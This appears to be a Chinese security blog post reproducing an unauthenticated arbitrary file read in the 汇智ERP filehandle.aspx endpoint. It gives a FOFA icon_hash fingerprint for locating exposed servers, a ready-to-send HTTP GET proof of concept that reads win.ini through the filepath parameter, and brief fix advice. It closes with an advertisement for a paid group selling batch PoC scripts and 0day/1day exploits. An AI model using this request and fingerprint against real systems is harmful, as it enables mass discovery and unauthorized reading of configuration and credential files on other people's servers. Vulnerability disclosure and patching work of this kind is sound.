#  「漏洞复现」汇智ERP filehandle.aspx 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-07-28 17:07  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
汇智ERP是一款由江阴汇智软件技术有限公司开发的企业资源规划（ERP）软件，旨在通过信息化手段帮助企业优化业务流程，提升管理效率，增强综合竞争力。适用于各类企业，包括大型企业、中小型企业以及集团化企业。根据企业规模和业务需求，汇智ERP提供了不同的版本（如集团版和标准版），以满足企业的个性化需求。  
  
0x03  
  
**漏洞威胁**  
  
汇智ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
icon_hash="-642591392"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oy6urEnBnp6iaMH9XnibKFuBkuzVfg26tibsnO8dUK1mtRDiat2cia5jPicQEWmGGQaZsxCrziczicg4KZSQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oy6urEnBnp6iaMH9XnibKFuBhIEjf9p3CZp3FGjicfmiaYxNK9TibtSb8BtMiazWicJWKnVcoPZosK8wZJw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oy6urEnBnp6iaMH9XnibKFuBdy8toJ3vL44wTufTicG3Y03BwOQYWibBtHjaaxgZYrdJbJq8wMGLVwJA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oy6urEnBnp6iaMH9XnibKFuBJBs8MNgDm7JJKT0MInQDZSWkJMFw53zUXKD44bHFOmicT1zHplHfgLQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oy6urEnBnp6iaMH9XnibKFuBDFEdl4G8UBZNcfaOYT9TIXFSufibZHltZd93z3FnDU4bpHMFkSMsMNA/640?wx_fmt=gif&from=appmsg "")  
  
  
